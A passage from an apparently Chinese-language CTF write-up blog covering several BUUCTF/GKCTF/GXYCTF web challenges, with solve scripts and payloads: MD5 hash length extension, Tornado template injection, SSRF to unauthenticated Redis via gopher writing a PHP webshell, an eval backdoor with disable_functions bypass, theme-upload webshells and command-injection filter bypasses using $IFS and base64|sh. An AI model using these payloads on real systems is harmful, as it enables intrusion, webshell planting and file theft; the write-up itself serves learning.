class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line">from flask import Flask</span><br><span class="line">from flask import request</span><br><span class="line">import socket</span><br><span class="line">import hashlib</span><br><span class="line">import urllib</span><br><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line">import json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name_<span class="number">_</span>)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(<span class="keyword">self</span>, action, param, sign, ip)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">self</span>.action = action</span><br><span class="line">        <span class="keyword">self</span>.param = param</span><br><span class="line">        <span class="keyword">self</span>.sign = sign</span><br><span class="line">        <span class="keyword">self</span>.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(<span class="keyword">self</span>.sandbox)): <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(<span class="keyword">self</span>.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">self</span>.checkSign())<span class="symbol">:</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> <span class="keyword">self</span>.<span class="symbol">action:</span></span><br><span class="line">                tmpfile = open(<span class="string">&quot;./%s/result.txt&quot;</span> % <span class="keyword">self</span>.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(<span class="keyword">self</span>.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>)<span class="symbol">:</span></span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="symbol">else:</span></span><br><span class="line">                    print resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> <span class="keyword">self</span>.<span class="symbol">action:</span></span><br><span class="line">                f = open(<span class="string">&quot;./%s/result.txt&quot;</span> % <span class="keyword">self</span>.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span><span class="symbol">:</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="symbol">else:</span></span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(<span class="keyword">self</span>.action, <span class="keyword">self</span>.param) == <span class="keyword">self</span>.sign)<span class="symbol">:</span></span><br><span class="line">            <span class="keyword">return</span> True</span><br><span class="line">        <span class="symbol">else:</span></span><br><span class="line">            <span class="keyword">return</span> False</span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line">@app.route(<span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>])</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span></span><span class="symbol">:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">&#x27;/De1ta&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>])</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span></span><span class="symbol">:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param))<span class="symbol">:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line">@app.route(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span></span><span class="symbol">:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span></span><span class="symbol">:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="symbol">try:</span></span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[<span class="symbol">:</span><span class="number">50</span>]</span><br><span class="line">    <span class="symbol">except:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span></span><span class="symbol">:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(content)</span></span><span class="symbol">:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span></span><span class="symbol">:</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>)<span class="symbol">:</span></span><br><span class="line">        <span class="keyword">return</span> True</span><br><span class="line">    <span class="symbol">else:</span></span><br><span class="line">        <span class="keyword">return</span> False</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name_<span class="number">_</span> == <span class="string">&#x27;__main__&#x27;</span><span class="symbol">:</span></span><br><span class="line">    app.debug = False</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>

<p>分为3个路由，geneSgn生成<code>&#39;scan&#39; + param</code>的md5。index给你看一下源代码。challenge接受action，param，sign三个参数，param过一下waf（不能以<code>gopher</code>或者<code>file</code>开头），进入Exec，首先检查<code>secret_key + param + action</code>的md5与 sing 是否一致，然后判断 scan 和 read 是否在action中。如果含有scan则把param文件写入tmpfile，含有read返回tmpfile的内容。</p>
<p>解法一：哈希长度扩展攻击</p>
<p>secret_key长度16，<code>geneSign?param=flag.txt</code> 可以得到 <code>md5(secret_key + &#39;flag.txt&#39; + &#39;scan&#39;)</code>，目的是获取<code>md5(secret_key + &#39;flag.txt&#39; + action)</code>其中action含有read。可以使用哈希长度扩展攻击。</p>
<p>得到action 为 <code>scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%a0%00%0 0%00%00%00%00%00read</code>时的md5<code>9b02232286ed9dd4f7e52eba63094180</code>，发包即可。</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &#x27;http://<span class="number">63904195</span><span class="number">-027</span>d<span class="number">-4866</span>-a<span class="number">049</span><span class="number">-78</span>fd<span class="number">37</span>f<span class="number">2</span>a<span class="number">920</span>.node<span class="number">3</span>.buuoj.cn/De<span class="number">1</span>ta?param=flag.txt&#x27;</span><br><span class="line">cookies = &#123;</span><br><span class="line">  &#x27;sign&#x27;: &#x27;<span class="number">9</span>b<span class="number">02232286</span>ed<span class="number">9</span>dd<span class="number">4</span>f<span class="number">7e52</span>eba<span class="number">63094180</span>&#x27;,</span><br><span class="line">  &#x27;action&#x27;: &#x27;scan<span class="symbol">%80</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%e0</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span>read&#x27;,</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">r = requests.get(url, cookies=cookies)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>

<p>解法二：字符串拼接</p>
<p>问题在于geneSign处，返回的md5是<code>scret_key + flag.txt + scan</code>，即<code>&lt;secret_key&gt;flag.txtscan</code>，所以直接访问<code>/geneSign?param=flag.txtread</code>得到的md5就是<code>&lt;secret_key&gt;flag.txtreadscan</code>的MD5，用这个MD5作为sign访问<code>/De1ta?param=flag.txt</code>，action为readscan，直接可以得到flag。</p>
<p><code>urllib.urlopen()</code>可以用<code>file://</code>包含文件，这里过滤了，可以使用<code>local_file:</code>代替。</p>
<h4 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy tornado"></a>easy tornado</h4><p>hint.txt里面告诉了filehash的生成方式，需要我们找到cookie_secret。</p>
<p>welcome.txt 写了render，flag.txt里给了flag的路径。</p>
<p><code>http://3d7b4f67-c482-4541-ba68-e1cf1b467deb.node3.buuoj.cn/file ?filename=/fllllllllllllag</code>，提示Error，同时url变成<code>http://3d7b4f67-c482-4541-ba68-e1cf1b467deb.node3.buuoj.cn/error?msg=Error</code>，结合上面的render可以想到模板注入获得cookie_secret。</p>
<p><code>http://3d7b4f67-c482-4541-ba68-e1cf1b467deb.node3.buuoj.cn/error?msg=&#123;&#123;handler.application.settings&#125;&#125;</code>，得到cookiesecet，<code>e85fca1a-db5a-4d80-82aa-53d3a3d1637a </code>，MD5一下</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">import</span> hashlib</span><br><span class="line"><span class="attribute">cs</span> = &#x27;e<span class="number">85</span>fca<span class="number">1</span>a-db<span class="number">5</span>a-<span class="number">4</span>d<span class="number">80</span>-<span class="number">82</span>aa-<span class="number">53</span>d<span class="number">3</span>a<span class="number">3</span>d<span class="number">1637</span>a&#x27;</span><br><span class="line"><span class="attribute">fn</span> = /fllllllllllllag</span><br><span class="line"><span class="attribute">def</span> md<span class="number">5</span>(s):</span><br><span class="line">	<span class="attribute">md5</span> = hashlib.md<span class="number">5</span></span><br><span class="line">	<span class="attribute">md5</span>.update(s.encode())</span><br><span class="line">	<span class="attribute">return</span> md<span class="number">5</span>.hexdigest()</span><br><span class="line"><span class="attribute">print</span>(md<span class="number">5</span>(cs+md<span class="number">5</span>(fn)))</span><br></pre></td></tr></table></figure>

<p><code>http://3d7b4f67-c482-4541-ba68-e1cf1b467deb.node3.buuoj.cn/file ?filename=/fllllllllllllag &amp;filehash=a7982b91f8645e9107b05b0721a6fceb</code></p>
<h4 id="GKCTF2020-cve版签到"><a href="#GKCTF2020-cve版签到" class="headerlink" title="[GKCTF2020]cve版签到"></a>[GKCTF2020]cve版签到</h4><p>含有提示 cve-2020-7066，查一下，getheaders函数存在00截断，tips 要求结尾是123</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http:%<span class="number">2f</span>%<span class="number">2f</span>127<span class="number">.0</span><span class="number">.0</span><span class="number">.123</span>%<span class="number">00</span>www.ctfhub.com</span><br></pre></td></tr></table></figure>

<h4 id="GKCTF2020-老八小超市儿"><a href="#GKCTF2020-老八小超市儿" class="headerlink" title="[GKCTF2020]老八小超市儿"></a>[GKCTF2020]老八小超市儿</h4><p><a target="_blank" rel="noopener" href="https://www.nctry.com/1660.html">shopxo后台全版本获取shell复现</a></p>
<p>访问后台<code>/admin.php?s=/admin/logininfo.html</code>，使用<code>admin:shopxo</code>登录</p>
<p>找到 应用中心 应用商店 主题，下载粉红主题，在主题的 <code>default/_static_/</code>目录下添加木马，重新压缩</p>
<p>到 网站管理 主题管理 主题安装，上传压缩后的主题，l连接木马路径<code>/public/static/index/lengyu/shell.php</code></p>
<p>根目录下的 flag 文件提示 flag 在 root 下，但无权限。根目录有 auto.sh，定时运行 makeflag，找到该文件，改为</p>
<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="built_in">os</span></span><br><span class="line"><span class="built_in">os</span>.system(<span class="string">&quot;cat /root/flag&gt;/1.txt&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>等待一分钟，得到 flag</p>
<h4 id="GKCTF2020-EZ三剑客-EzWeb"><a href="#GKCTF2020-EZ三剑客-EzWeb" class="headerlink" title="[GKCTF2020]EZ三剑客-EzWeb"></a>[GKCTF2020]EZ三剑客-EzWeb</h4><p>访问 secret ，除了 127.0.0.1 以外还有两个 IP 地址，173.183.118.10/24 和 172.18.0.13/12，应该是一个 SSRF，扫描一下 173.183.118.10/24 子网里的其他主机，</p>
<p>过滤了 <code>file://</code>和<code>dict://</code>协议，使用 HTTP 探测</p>
<p>使用 intruder 爆破，在 173.183.118.12 的响应中看到</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">被你发现了,但你也许需要试试其他服♂务,就在这台机子上! ...我说的是端口啦<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>爆破这台机器的端口，在 6379 端口看到</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-ERR wrong <span class="built_in">number</span> <span class="keyword">of</span> arguments <span class="keyword">for</span> <span class="string">&#x27;get&#x27;</span> <span class="keyword">command</span></span><br></pre></td></tr></table></figure>

<p>存在 redis 服务</p>
<p>使用 gopher 协议利用未授权访问写入 shell</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">protocol = r<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip = <span class="string">&quot;173.183.118.12&quot;</span></span><br><span class="line">port = <span class="string">&quot;6379&quot;</span></span><br><span class="line">shell = <span class="string">&quot;\n\n&lt;?php system(\&quot;cat /flag\&quot;);?&gt;\n\n&quot;</span></span><br><span class="line">filename = <span class="string">&quot;shell.php&quot;</span></span><br><span class="line">path = <span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line">passwd = <span class="string">&quot;&quot;</span></span><br><span class="line">cmd = [<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">       <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.format(shell.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;<span class="variable">$&#123;IFS&#125;</span>&quot;</span>)),</span><br><span class="line">       <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.format(path),</span><br><span class="line">       <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.format(filename),</span><br><span class="line">       <span class="string">&quot;save&quot;</span></span><br><span class="line">       ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(0, <span class="string">&quot;AUTH &#123;&#125;&quot;</span>.format(passwd))</span><br><span class="line">payload = protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def redis_format(arr):</span><br><span class="line">    CRLF = <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd = <span class="string">&quot;&quot;</span></span><br><span class="line">    cmd += <span class="string">&quot;*&quot;</span>+str(len(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd += CRLF+<span class="string">&quot;$&quot;</span> + \</span><br><span class="line">            str(len((x.replace(<span class="string">&quot;<span class="variable">$&#123;IFS&#125;</span>&quot;</span>, <span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;<span class="variable">$&#123;IFS&#125;</span>&quot;</span>, <span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd += CRLF</span><br><span class="line">    return cmd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += urllib.quote(redis_format(x))</span><br><span class="line">    <span class="builtin-name">print</span> payload</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>生成 payload</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">gopher</span>://<span class="number">173.183.118.12:6379</span>/_%<span class="number">2</span>A<span class="number">1</span>%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">248</span>%<span class="number">0</span>D%<span class="number">0</span>Aflushall%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2</span>A<span class="number">3</span>%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">243</span>%<span class="number">0</span>D%<span class="number">0</span>Aset%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">241</span>%<span class="number">0</span>D%<span class="number">0</span>A<span class="number">1</span>%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2432</span>%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">3</span>C%<span class="number">3</span>Fphp%<span class="number">20</span>system%<span class="number">28</span>%<span class="number">22</span>cat%<span class="number">20</span>/flag%<span class="number">22</span>%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">3</span>F%<span class="number">3</span>E%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2</span>A<span class="number">4</span>%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">246</span>%<span class="number">0</span>D%<span class="number">0</span>Aconfig%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">243</span>%<span class="number">0</span>D%<span class="number">0</span>Aset%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">243</span>%<span class="number">0</span>D%<span class="number">0</span>Adir%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2413</span>%<span class="number">0</span>D%<span class="number">0</span>A/var/www/html%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2</span>A<span class="number">4</span>%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">246</span>%<span class="number">0</span>D%<span class="number">0</span>Aconfig%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">243</span>%<span class="number">0</span>D%<span class="number">0</span>Aset%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2410</span>%<span class="number">0</span>D%<span class="number">0</span>Adbfilename%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">249</span>%<span class="number">0</span>D%<span class="number">0</span>Ashell.php%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2</span>A<span class="number">1</span>%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">244</span>%<span class="number">0</span>D%<span class="number">0</span>Asave%<span class="number">0</span>D%<span class="number">0</span>A</span><br></pre></td></tr></table></figure>

<p>在 url 中访问 <code>http://173.183.118.12/shell.php</code></p>
<h4 id="GKCTF2020-CheckIN"><a href="#GKCTF2020-CheckIN" class="headerlink" title="[GKCTF2020]CheckIN"></a>[GKCTF2020]CheckIN</h4><p>把 base64 编码后的命令传入<code>Ginkgo</code>后就可以执行</p>
<figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?Ginkgo=cGhwaW5mbygpOw== <span class="function"><span class="keyword">#</span><span class="title">phpinfo</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>

<p>存在 disable_functions，禁用了一些执行系统命令的函数。本质上是一个黑名单。</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">Ginkgo</span>=QGV2YWwoJF9HRVRbJ2MnXSk7&amp;c=phpinfo(); # @eval(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>测试成功，使用蚁剑连接，发现根目录下的 flag，不可读。存在 readflag 二进制文件。</p>
<p>使用 Github 上的 PHP 7.0-7.3 disable_functions bypass，<a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits">项目地址</a>，使用 gc-bypass，修改其中的命令为 <code>/readflag</code>，上传至 <code>/tmp</code>，include 上传的文件</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?Ginkgo=QGV2YWwoJF9HRVRbJ2MnXSk7&amp;c=<span class="keyword">include</span>(<span class="string">&#x27;/tmp/exploit.php&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>得到 flag</p>
<h4 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h4><p>上传 .htaccess 修改类型，上传图片马，蚁剑连接。有个坑，蚁剑不能连 GET 的马。</p>
<h4 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">localeconv</span><span class="params">()</span></span> 函数返回一包含本地数字及货币格式信息的数组。</span><br><span class="line"><span class="function"><span class="title">scandir</span><span class="params">()</span></span> 列出 images 目录中的文件和目录。</span><br><span class="line"><span class="function"><span class="title">readfile</span><span class="params">()</span></span> 输出一个文件。</span><br><span class="line"><span class="function"><span class="title">current</span><span class="params">()</span></span> 返回数组中的当前单元, 默认取第一个值。</span><br><span class="line"><span class="function"><span class="title">pos</span><span class="params">()</span></span> current() 的别名。</span><br><span class="line"><span class="function"><span class="title">next</span><span class="params">()</span></span> 函数将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line"><span class="function"><span class="title">array_reverse</span><span class="params">()</span></span>以相反的元素顺序返回数组。</span><br><span class="line"><span class="function"><span class="title">highlight_file</span><span class="params">()</span></span>打印输出或者返回 filename 文件中语法高亮版本的代码。</span><br></pre></td></tr></table></figure>

<p>存在.git泄露，得到源码。同时存在白名单和黑名单</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp=highlight_file(<span class="name">next</span>(<span class="name">array_reverse</span>(<span class="name">scandir</span>(<span class="name">pos</span>(<span class="name">localeconv</span>())))))<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<h4 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h4><p>命令执行，过滤了空格和很多特殊字符。</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?ip=<span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span>|ls <span class="comment">//发现index.php和flag.php</span></span><br><span class="line">?ip=<span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span>|cat flag.php <span class="comment">//发现过滤了空格</span></span><br><span class="line">?ip=<span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span>|cat&lt;flag.php <span class="comment">//过滤了特殊字符</span></span><br><span class="line">?ip=<span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span>|cat$IFS$<span class="number">1f</span>lag.php <span class="comment">//用$IFS$1代替空格,发现过滤了flag</span></span><br><span class="line">?ip=<span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span>|cat$IFS$<span class="number">1</span>index.php <span class="comment">//查看源码，发现过滤了特殊字符、bash、空格、flag</span></span><br><span class="line">?ip=<span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span>;a=g;cat$IFS$<span class="number">1f</span>la$a.php <span class="comment">//利用shell变量绕过flag的过滤</span></span><br><span class="line">?ip=<span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span>;echo$IFS$<span class="number">1</span>Y2F0IGZsYWcucGhw|base64$IFS$<span class="number">1</span>-d|sh <span class="comment">//用sh执行</span></span><br><span class="line">?ip=<span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span>;cat$IFS`ls` <span class="comment">//内联执行，反引号内的命令输出作为输入			</span></span><br></pre></td></tr></table></figure>

